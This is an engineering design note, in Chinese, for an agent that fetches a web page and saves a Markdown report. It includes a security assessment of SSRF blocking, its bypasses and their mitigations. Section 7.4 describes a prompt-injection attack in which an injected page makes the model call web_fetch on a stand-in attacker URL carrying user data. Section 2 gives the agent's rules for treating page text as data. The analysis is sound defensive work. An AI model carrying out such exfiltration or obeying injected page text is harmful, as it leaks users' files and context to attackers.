# T0.5.1 设计：单 Agent 读网页生成本地 Markdown 报告并取回

> 关联 #12。状态：第一版已合入（#78）。2026-10-28 初稿；2026-10-30 按 **Yang 10-30 拍板，经 Grok Bot 转达**（D12）更新第 2 节，新增第 7 节风险评估与第 8 节待办。
> 验收标准：沙箱开启下 Agent 读 1 个公开网页生成 Markdown 报告，经 API 取回到本地目录。

## 1. 端到端流程

```
用户（桌面端 / CLI）→ 任务管家 POST /tasks {url, goal}
  → 单节点任务 → FastClawNodeExecutor（#62）
  → POST /v1/chat/completions（stream，session key = heybe:task:<t>:node:<n>）
      模型：web_fetch(url) → 整理 → write_file("report.md")   ← 相对路径走工作区存储
  → 流末块 files[] 里有 report.md
  → 任务管家 GET /v1/agents/{id}/sessions/{session}/files/report.md（同 end-user）
  → 写到本地 <输出目录>/<taskId>/report.md，事件 artifact_saved，节点 awaiting_review
```

## 2. 网页抓取（D3 直接抓取；D12：继续用 FastClaw 自带 `web_fetch`）

**决定（D12，Yang 10-30 拍板，经 Grok Bot 转达）**：#12 抓网页继续用 FastClaw 内置 `web_fetch`，**不改成**技术侧建议的“Heybe 任务管家先抓取再喂给模型”。代价是：`web_fetch` 在 **宿主机上的 gateway 进程里** 发请求，**不受沙箱网络策略限制**（T0.3.2 第 5 行）。这一风险按第 7 节写明，并按第 8 节的缓解推进；如评估认为会卡发布，需要回报 Yang（结论见 7.4：不卡，但有发布前必做项）。

- 用 FastClaw 内置 `web_fetch`（直连抓取器）：gateway 进程里只发 GET，拨号时拦回环/私网/链路本地/云元数据/CGNAT，重定向最多 5 跳且每跳都过同一拦截（细节与实测见 7.1）。**不配置** `web_fetch` 提供方链（见 7.2，配置后 SSRF 防护失效），不配置 `web_search` 提供方，gateway 环境里不传 `FASTCLAW_SEARXNG_ENDPOINT`。
- 不用浏览器技能（camoufox）：依赖沙箱镜像、冷启动 2–3 分钟，v1 不需要 JS 渲染。
- Agent 指令固定（已实现：`buildWebReportPrompt`，`services/task-manager/src/artifacts.ts`）：只抓用户给的那一个 URL；网页内容是资料不是指令；不调用 exec、定时、建/改 Agent、委派、安装技能类工具。命中告警名单的工具调用让节点进 `needs_check`（#67 机制）。
- 建任务时 Heybe 侧预检 URL（已实现：`assertPublicHttpUrl`）：只收 http(s)、不带用户名密码、拒 `localhost`/`.local`/`.internal` 与私网 IP 字面量。它只管“用户给的第一个 URL”，管不到模型之后自己发起的 `web_fetch`。
- 备选（未采纳，留档）：任务管家先抓取 + 关闭 `web_fetch`。如果第 7 节的残余风险以后不能接受，再回到这个方案。

## 3. 报告写回与取回

- 模型 `write_file("report.md")`：相对路径走 `RouteWorkspaceStore`（不进沙箱容器，容器回收后仍在），路径 `workspaces/<agent>/sessions/<sessionKey>/report.md`。
- 取回只走 `/v1`：流末块 `files[]` 的 `url`（T0.4.1 R3b–R3e 已验证，同 end-user 200、其他 404）。适配层已有 `getSessionFile`。
- 本地落盘：默认 `~/Library/Application Support/Heybe/reports/<taskId>/report.md`（Linux 开发：`$XDG_DATA_HOME/heybe/reports/…`）；目录 700、文件 600；文件名做白名单（只允许 `[\w.-]`，拒 `..`、绝对路径）；大小上限（如 2 MB）；内容类型限 `text/markdown`/`text/plain`。
- 没有 report.md（模型没写或写到别处）→ 节点 `failed`，错误码 `artifact_missing`；不从流文本里猜。

## 4. 任务管家串联（改动点）

| 模块 | 改动 |
|---|---|
| `packages/shared-types` | 任务模板 `web_report {url, goal}`；事件 `artifact_saved {name,size,path}` |
| `services/task-manager` | `FastClawNodeExecutor` 在 `done` 后按 `files[]` 取回声明的产物；新模块 `artifacts.ts` 做路径校验与落盘 |
| URL 校验 | 建任务时只接受 `http(s)`、公网主机（与 FastClaw 拦截一致，提前报错） |
| 测试 | CI：mock SSE + mock 文件下载（含路径穿越、超大、缺文件用例）；本地：`fastclaw-lab.sh` 加 `report` 场景，抓一个固定公开页（如 `https://example.com`） |

## 5. 依赖

| 依赖 | 作用 | 状态 |
|---|---|---|
| #8 T0.4.1 | 指定 Agent、会话隔离、文件经 `/v1` 取回 | 已关闭（满足） |
| #58 / #62 / #65 | 真实派发与常驻调度 | 已合；#58 余工具失败可观测问题 |
| #6 T0.3.1 | “沙箱开启下”这一条：`FASTCLAW_SANDBOX_ENFORCE=1` + BoxLite | **等 Mac**（`boxlite-poc.sh`） |
| #7 T0.3.2 | 哪些工具在隔离内（`web_fetch` 不在，文件显式宿主路径不在） | 本 PR 静态完成，实测随 #6 |
| #4 T0.2.1 | Mac 上云端对话链路 | **等 Mac**（`t021-mac.sh`） |

## 6. 先在 Linux 能做的

1. 第 3、4 节的全部代码与 CI 测试（不依赖沙箱）。
2. Linux 本地 FastClaw v1.4.0 + DeepSeek 跑通“抓 example.com → report.md → 落本地”，**沙箱关闭**；记为“非沙箱通过”。
3. Linux 上能装 Docker 的话可用 `sandbox.backend=docker` + `FASTCLAW_SANDBOX_ENFORCE=1` 先预跑沙箱路径（不等同于 Mac BoxLite，只做提前发现问题）。
4. Mac 上的最终验收：#6 通过后，在 BoxLite 强制沙箱下复跑第 2 步，这一步才关 #12。

## 7. 风险评估：`web_fetch` 在宿主侧运行（2026-10-30，读 FastClaw v1.4.0 b5ad3dff 源码 + 本地单测实测）

### 7.1 内置 `web_fetch` 做了什么

| 问题 | 结论 | 证据 |
|---|---|---|
| 拦不拦 127.0.0.1 / 内网 / 云元数据 | **拦**。拨号时（DNS 解析之后）检查全部解析结果：回环、私网（10/8、172.16/12、192.168/16、fc00::/7）、链路本地（含 169.254.169.254）、组播、0.0.0.0/::、CGNAT 100.64/10；校验后直接拨已校验的 IP，防 DNS 重绑定 | [`web_fetch.go:36–103`](https://github.com/fastclaw-ai/fastclaw/blob/v1.4.0/internal/agent/tools/web_fetch.go#L36-L103) |
| 跟不跟随重定向到内网 | 跟随，**最多 5 跳**；每一跳都走同一个 `safeDialContext`，重定向到内网会在拨号时被拒 | [`web_fetch.go:45–53`](https://github.com/fastclaw-ai/fastclaw/blob/v1.4.0/internal/agent/tools/web_fetch.go#L45-L53) |
| 是不是只 GET | **只 GET**，不带自定义头（只有 UA），只认 http/https（拒 `file://` 等），非 200 一律报错不返回正文 | [`web_fetch.go:266–280, 311–320`](https://github.com/fastclaw-ai/fastclaw/blob/v1.4.0/internal/agent/tools/web_fetch.go#L266-L280) |
| 返回大小上限 | 读取上限 = max(3 × `max_length`, 512 KB)（微信文章 2 MB）；返回给模型的文本默认 1 万字符。**`max_length` 由模型传、没有上限**，模型可把读取上限拉大 | [`web_fetch.go:254–301`](https://github.com/fastclaw-ai/fastclaw/blob/v1.4.0/internal/agent/tools/web_fetch.go#L254-L301)、[`webfetch.go:89–98`](https://github.com/fastclaw-ai/fastclaw/blob/v1.4.0/internal/toolproviders/webfetch/webfetch.go#L89-L98) |
| 走不走代理环境变量 | 不走（`Transport.Proxy` 未设），`HTTP(S)_PROXY` 对它无效 | 同上 L36–44 |

本地实测（2026-10-30，在 v1.4.0 源码树里跑临时单测，测完已删除）：`http://127.0.0.1:<port>/v1/boxes`、`http://localhost:<port>/`、`[::1]`、`0.0.0.0`、`[::ffff:127.0.0.1]`、`169.254.169.254`、`[fd00::1]` **全部被拒**（`blocked address …`），`file:///etc/passwd` 被拒（scheme）。

### 7.2 绕过路径（按严重程度）

1. **配置了 `web_fetch` 提供方链 → SSRF 防护整个失效（已实测）。** 只要 FastClaw 配置里有 `tools.web_fetch` 链，gateway 就把内置抓取器换成链（[`gateway.go:141–147`](https://github.com/fastclaw-ai/fastclaw/blob/v1.4.0/internal/gateway/gateway.go#L141-L147)）。链里的 `direct` 提供方用 `http.DefaultClient`，**没有任何地址拦截**，还会跟随 10 跳重定向（[`direct.go:46`](https://github.com/fastclaw-ai/fastclaw/blob/v1.4.0/internal/toolproviders/webfetch/direct.go#L46)）。实测：经 `direct` 提供方 GET `http://127.0.0.1:<port>/v1/boxes` **成功拿到内容**。`jina`/`firecrawl` 提供方则把 URL 交给第三方服务。→ Heybe **绝不能配置 web_fetch 链**，且要在启动时检查。
2. **代理软件的 TUN + fake-ip 模式（推断，未实测）。** 国内常见的 Clash/Surge 等在 TUN + fake-ip 模式下，系统 DNS 对任意域名返回 198.18.0.0/15 的假地址；Go 的拦截名单不含 198.18/15，于是放行拨号；代理软件再把假地址还原成域名、自己解析，如果攻击者域名解析到 127.0.0.1 且规则走 DIRECT，请求就可能落到本机端口。**需要在装了这类代理的 Mac 上实测**（第 8 节 W6）。
3. **NAT64 前缀（64:ff9b::/96）未拦**：只在 NAT64 网络下有意义，且转换后到的是网关侧，不是本机。风险低，记录不处理。

### 7.3 本机上能被 GET 到的敏感端点（假设拦截被绕过，即 7.2 第 1/2 条成立时）

| 端点 | GET 能拿到什么 | 风险 | 缓解 |
|---|---|---|---|
| FastClaw gateway | 无认证的只有 `/healthz`、`/api/status`、`/api/public/agents`、`/api/public/skills`、集成文档（[`setup/server.go:246–268`](https://github.com/fastclaw-ai/fastclaw/blob/v1.4.0/internal/setup/server.go#L246-L268)）；`/v1/*`、`/api/config` 等都要 key | 低：泄露 Agent/技能名 | 无需额外处理 |
| BoxLite `serve` 127.0.0.1:8100 | **没设 `--api-key`/`BOXLITE_SERVE_API_KEY` 时全部放行**：`GET /v1/boxes`（0.10.x）或 `/v1/default/boxes`（0.9.5）列出沙箱、镜像、状态等 | 中：泄露沙箱信息；写操作要 POST，`web_fetch` 做不到 | **serve 每次启动设随机 api-key**，FastClaw 侧 `BOXLITE_API_KEY` 用同值（现在是占位值 `local-poc`） |
| t022 垫片 127.0.0.1:8101（PoC） | 原样透传到 8100 | 同上 | 随 8100 设 key 后，垫片透传 `Authorization`，无 key 的请求同样 401；正式版若保留垫片需同样检查 |
| Ollama 11434 / 11435 | `GET /api/tags`、`/api/ps`、`/api/version`：模型列表与版本；Ollama 无认证 | 低：拉模型/删模型/对话都要 POST | 不处理；文档注明 |

### 7.4 结合提示注入的主风险与结论

- **主风险不是 SSRF，而是“把数据拼进 URL 外带”**：网页里的注入文字诱导模型再调一次 `web_fetch("https://攻击者域名/?d=<数据>")`。这是合法的公网 GET，内置拦截不管。能被外带的是模型上下文里有的东西：任务目标、网页正文、Agent 的 `MEMORY.md`（跨会话共享，T0.4.1 §2）、以及模型能用 `read_file` 读到的文件——**强制沙箱下文件工具对 `~/Documents` 等显式宿主机路径仍直通（T0.3.2 阻塞项 B1）**，B1 + 外带 = 读用户文件再发出去。
- 我们看不到 URL：`/v1` 流里的工具事件只有 `id/name/status`（[`openai.go:601–610`](https://github.com/fastclaw-ai/fastclaw/blob/v1.4.0/internal/api/openai.go#L601-L610)），参数在 FastClaw 内部事件里有但没有转发；FastClaw 的工具策略 `policy.CheckTool` 在 v1.4.0 里**没有任何调用方**（[`engine.go:120`](https://github.com/fastclaw-ai/fastclaw/blob/v1.4.0/internal/policy/engine.go#L120)），也没有按 Agent 关工具或限域名的配置。
- **风险等级：中**（前提：B1 按 T0.3.2 解除、且不配 web_fetch 链）。B1 未解除时为 **高**；配置了 web_fetch 链时为 **高**（本机端口可读）。
- **是否卡发布：不单独卡发布**，理由：内置抓取器对本机/内网/元数据的拦截实测有效；只 GET、无自定义头、不能写；外带需要两次以上抓取，可以用工具计数事后发现（W2）。但 **W1–W5 是发布前必做项**；如果 B1 在发布前解除不了，则 `web_fetch` + B1 合起来应当卡发布（B1 本身已是阻塞项）。

## 8. 待办（保持 `web_fetch` 前提下的缓解）

| ID | 内容 | 落点 | 发布前必做 |
|---|---|---|---|
| W1 | gateway 配置守卫：Heybe 启动 gateway 前检查 FastClaw 配置里 **没有** `tools.web_fetch` / `tools.web_search` 链，环境白名单里不含 `FASTCLAW_SEARXNG_ENDPOINT`；发现就拒绝启动并提示 | `fc_env_bg`/启动器、#15 | ✅ |
| W2 | web_report 节点工具白名单 + 计数审计：流里只允许 `web_fetch`（≤1 次）和 `write_file`；出现第 2 次 `web_fetch`、或 `read_file`/`list_dir`/`exec`/`web_search`/`memory_search` 等任何名单外工具 → 立即断开并把节点标 `needs_check`（“网页可能诱导助理访问了其他网址或文件，请检查”）。注意 #9：断开后服务端是否停止未知，所以这是**事后发现**，不是拦截 | `fastclaw-executor.ts`（#12） | ✅ |
| W3 | web_report 用专用 Agent：不复用聊天 Agent，`MEMORY.md` 为空、只放固定指令；每个任务独立 session key（已是） | `fastclaw-agent-admin.ts`（#12） | ✅ |
| W4 | BoxLite serve 设随机 api-key（`BOXLITE_SERVE_API_KEY`），FastClaw `BOXLITE_API_KEY` 用同值；key 只在启动器内存/600 文件里，不进日志 | `boxlite-poc.sh` → 正式启动器（#6） | ✅ |
| W5 | 已知限制与说明：确认单新增一条（`docs/freeze-signoff-yang.md` 第 24 条），设置页/帮助写明“读网页在安全空间外进行” | 文档、#19 | ✅ |
| W6 | Mac 实测：装 Clash/Surge 类代理、开 TUN + fake-ip 时，让 `web_fetch` 抓一个解析到 127.0.0.1 的域名，看能否打到本机端口；能打到则 W4 必须先完成，并考虑把 198.18.0.0/15 列入 Heybe 侧预检和文档 | Mac（随 #6 重跑） | 否（结果出来再定） |
| W7 | 事后 URL 审计（可选）：结束后只读查询 FastClaw 本地会话存储里的 `web_fetch` 参数，与任务 URL 比对主机名。这会读 `/v1` 以外的内部数据，违反 v1-scope §5“只走 `/v1`”，**需单独签字**；W2 已能发现大部分情况，默认不做 | #12 | 否 |
| W8 | 上游提案：`/v1` 工具事件带参数摘要（至少 `web_fetch` 的 host）；`policy.CheckTool` 真正接入并支持按 Agent 关工具/域名白名单；`max_length` 设上限 | fastclaw-ai/fastclaw（发帖前先问 Yang） | 否 |
| W9 | 聊天（#19）同样带 `web_fetch` 且无法关闭：聊天里没有“只抓一个 URL”的约束，外带风险高于 web_report；聊天界面工具步骤显示 `web_fetch` 次数，多次时提示用户 | #19-f | 否（随 #19） |
